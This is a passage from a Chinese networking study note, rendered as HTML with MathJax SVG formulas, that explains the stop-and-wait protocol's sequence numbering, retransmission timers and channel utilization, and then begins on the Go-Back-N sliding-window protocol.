个分组，但是此时超时重传的分组已经发送出去，接收方接收到后会发送一个一样的ACK信号。</p><p>所以同样需要给ACK或NAK信号编号。但在点对点通信中，传输的时钟周期比较固定，很少出现确认迟到的情况，可以不用给确认分组编号。</p></li></ol><p><strong>注意事项</strong>：</p><ul><li>接收端检测到数据分组有误码时，将其丢弃并等待发送方的超时重传。但对于误码率较高的点对点链路，为使发送方尽早重传，也可给发送方发送NAK分组。</li><li>为了让接收方能够判断所收到的数据分组是否是重复的，需要给数据分组编号。由于停止-等待协议的停等特性，只需1个比特编号就够了，即编号0和1。</li><li>为了让发送方能够判断所收到的ACK分组是否是重复的，需要给ACK分组编号，所用比特数量与数据分组编号所用比特数量一样。</li><li>点对点信道的数据链路层一般不会出现ACK分组迟到的情况，因此在数据链路层实现停止-等待协议可以不用给ACK分组编号。</li><li>超时计时器设置的重传时间应仔细选择。一般可将重传时间选为略大于“从发送方到接收方的平均往返时间”。<ul><li>在数据链路层点对点的往返时间比较确定，重传时间比较好设定。</li><li>然而在运输层，由于端到端往返时间非常不确定，设置合适的重传时间有时并不容易。</li></ul></li></ul><p><strong>停止-等待协议的信道利用率</strong></p><p>信道利用率就是发送方发送时延占据整个事件比例。</p><ul><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.834ex" height="1.871ex" role="img" focusable="false" viewBox="0 -677 1252.5 827"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(617,-150) scale(0.707)"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g></g></g></g></svg></mjx-container>：数组分组的发送时延</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.345ex" xmlns="http://www.w3.org/2000/svg" width="2.709ex" height="1.877ex" role="img" focusable="false" viewBox="0 -677 1197.3 829.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(617,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></svg></mjx-container>：接收方主机的处理时延</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.048ex" xmlns="http://www.w3.org/2000/svg" width="4.903ex" height="1.593ex" role="img" focusable="false" viewBox="0 -683 2167 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(759,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(1463,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>：往返时延</li></ul><p>则停止-等待协议的信道利用率计算公式<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container>为：</p><script type="math/tex; mode=display">U=\frac{T_D}{T_D+RTT+T_A}</script><img src="/posts/e255a10a/3.5.2.2.png" class="" title="信道利用率"><p>当往返时延RTT远大于数据帧发送时延TD时(卫星链路)，信道利用率非常低。若出现超市重传，信道利用率更低，因此就出现了另外两种协议：回退N帧协议GBN、选择重传协议SR。</p><h4 id="3-5-2-2-回退N帧协议-GBN，Go-Back-N"><a href="#3-5-2-2-回退N帧协议-GBN，Go-Back-N" class="headerlink" title="3.5.2.2 回退N帧协议(GBN，Go-Back-N)"></a>3.5.2.2 回退N帧协议(GBN，Go-Back-N)</h4><p>回退N帧协议可以理解为停止等待协议的一种优化，在相同的时间内，使用停止-等待协议的发送方只能发送一个数据分组，而采用流水线传输的发送方，可以发送多个数据分组。</p><img src="/posts/e255a10a/3.5.2.3.png" class="" title="回退N帧协议"><p>回退N帧协议在流水线传输的基础上，利用发送窗口限制发送方可连续发送数据分组的个数。</p><ol><li>使用3个比特给分组编序号，0~7</li><li>发送窗口的尺寸<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="3.45ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1524.8 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></g></svg></mjx-container>取值：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="16.631ex" height="2.224ex" role="img" focusable="false" viewBox="0 -833.2 7350.9 983.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="msub" transform="translate(1833.6,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(3636.1,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="msup" transform="translate(4691.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(5850.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6850.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，本例取<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.598ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 3358.4 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(1802.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2858.4,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></svg></mjx-container></li><li>接收窗口<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex" xmlns="http://www.w3.org/2000/svg" width="3.538ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1563.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>的取值：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex" xmlns="http://www.w3.org/2000/svg" width="7.686ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 3397.2 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g><g data-mml-node="mo" transform="translate(1841.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2897.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></li></ol><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.598ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 3358.4 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(1802.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2858.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 